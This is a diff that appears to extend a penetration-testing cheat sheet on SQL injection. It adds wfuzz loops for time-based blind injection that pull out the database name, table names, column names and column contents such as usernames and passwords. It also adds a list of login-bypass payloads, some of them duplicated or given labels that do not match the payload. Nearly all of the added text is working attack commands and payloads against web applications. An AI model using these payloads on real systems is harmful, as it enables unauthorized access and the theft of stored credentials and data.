@@ -65,3 +65,81 @@ Another thing to check in an SQLi is RCE capabilities (file write or OS command 
 ### 2) Double Quote
 
     "
+
+## Blind SQLi
+
+Determine database name
+
+    for i in $(seq 1 10); do 
+      wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
+    done > <filename.txt> && grep "0m9" <filename.txt
+
+    # Replace <filename.txt> with the name of the file to store results.
+    # Replace 10 in $(seq 1 10) with the estimated length of the database name.
+    # The FUZZ keyword is used by wfuzz to iterate through ASCII values.
+
+Determine table name
+
+    for i in $(seq 1 10); do 
+      wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
+    done > <filename.txt> && grep "0m9" <filename.txt
+
+    # Replace table_name and table_schema with the actual names if targeting specific databases or tables.
+    # Adjust LIMIT 0,1 to enumerate multiple tables by changing the first argument of LIMIT.
+
+Determine column name
+
+    for i in $(seq 1 10); do 
+      wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
+    done > <filename.txt> && grep "0m9" <filename.txt
+
+    # Replace <table_name> with the actual table name you are targeting.
+    # Adjust LIMIT 0,1 to retrieve column names for different tables.
+
+Extract column content
+
+    for i in $(seq 1 10); do 
+      wfuzz -v -c -z range,0-10 -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZ2Z, SLEEP(10), NULL) --+"; 
+    done > <filename.txt> && grep "0m9" <filename.txt
+
+    # Replace <column_name> with the column you're trying to extract (e.g., username, password).
+    # Replace <table_name> with the actual table name.
+    # The FUZZ value iterates over possible row entries (use LIMIT FUZZ, 1 to iterate rows).
+
+## Login Bypass
+
+Standard OR-based bypass
+
+    ' OR 1=1 --+
+
+Bypass with LIMIT (useful when multiple entries might be returned)
+
+    ' OR 1=1 LIMIT 1 --+
+
+Bypass by using string comparison (a common trick when numeric bypass fails)
+
+    ' OR 'a'='a --+
+
+Using AND to combine conditions and exploit certain scenarios
+
+    ' OR 3=3 --+
+
+More obfuscated example (avoiding use of typical 1=1):
+
+    ' OR 2=2 --+
+
+Bypass with string comparison (works for both MySQL and MSSQL)
+
+    ' OR 'a'='a' --+
+
+OR-based bypass with a numeric comparison
+
+    ' OR 3=3 --+
+
+Bypass with LIMIT for MySQL (restricts to 1 entry)
+
+    ' OR 1=1 LIMIT 1 --+
+
+MSSQL version of limiting output with TOP
+
+    ' OR 1=1; SELECT TOP 1 * FROM users --+
